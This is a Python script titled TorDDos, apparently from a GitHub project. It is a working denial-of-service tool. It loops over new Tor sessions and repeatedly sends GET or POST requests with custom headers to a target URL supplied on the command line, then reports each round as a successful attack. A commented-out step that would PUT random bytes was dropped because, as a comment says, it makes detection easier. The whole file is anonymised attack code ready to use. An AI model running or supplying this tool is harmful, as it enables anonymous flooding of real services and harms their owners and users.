#!/usr/bin/env python
# -*- coding: utf-8 -*-
# TorDDos (https://www.github.com/R3nt0n/torddos) (14/07/2019)
# R3nt0n  (https://www.github.com/R3nt0n)

import datetime
import sys

from lib.color import color
from lib.tor import Tor


def main():
    counter = 0
    start_time = ""
    try:
        while counter < max_attempts:
            tor = Tor()
            if not tor.tor_installed():
                print('{}[!]{} Tor is not installed. Exiting...'.format(
                    color.RED, color.END))
                sys.exit(1)
            else:
                # Initial timestamp and increment the counter
                start_time = datetime.datetime.now().time().strftime('%H:%M:%S')
                counter += 1

                # Init a new Tor session
                session = tor.new_session()
                for header in headers:
                    key, value = header.split(sep=":", maxsplit=2)
                    session.headers[key] = value

                print('{}[!]{} New Tor session initialized...'.format(
                    color.BLUE, color.END))
                print('\n{}[+]{} Target: {}{}{}'.format(color.PURPLE,
                                                        color.END, color.PURPLE, target, color.END))

                if not data:
                    ret = session.get(target).content
                else:
                    ret = session.post(target, data).content

                # Getting data from the server
                print(
                    '{}[*]{} Getting data({} - {}kb) from {}...'.format(color.ORANGE, color.END,  ret[0:100], int(len(ret)/1024), target))

                # Putting data (omitted, maybe it makes detection easier)
                # random_bytes = random._urandom(1490)
                # print('{}[*]{} Putting data on {}...'.format(color.ORANGE, color.END, target))
                # session.put(target, random_bytes)
                print(
                    '{}[*]{} Target {} was attacked succesfully'.format(color.ORANGE, color.END, target))

    except KeyboardInterrupt:
        pass
    except Exception as err:
        print('\n{}[!]{} An error has occurred:'.format(color.RED, color.END))
        print('{}{}{}'.format(color.RED, err, color.END))

    finally:
        end_time = datetime.datetime.now().time().strftime('%H:%M:%S')
        total_time = (datetime.datetime.strptime(
            end_time, '%H:%M:%S') - datetime.datetime.strptime(start_time, '%H:%M:%S'))
        print('{}[+]{} Time elapsed:\t{}'.format(color.GREEN, color.END, total_time))
        print(
            '{}[+]{} Number of requests:\t{}'.format(color.GREEN, color.END, counter))
        print('{}[!]{} Stopping Tor...'.format(color.RED, color.END))
        tor.stop_tor()
        print('{}[!]{} Exiting...\n'.format(color.RED, color.END))
        sys.exit(0)


if __name__ == '__main__':
    # Processing args
    from lib.args import *
    args = parser.parse_args()
    target = args.target
    max_attempts = args.max_attempts
    headers = args.headers
    data = args.data

    # Print help and exit when it runs without target arg
    if not target:
        parser.print_help(sys.stdout)
        sys.exit(2)
    # Run the main execution
    main()
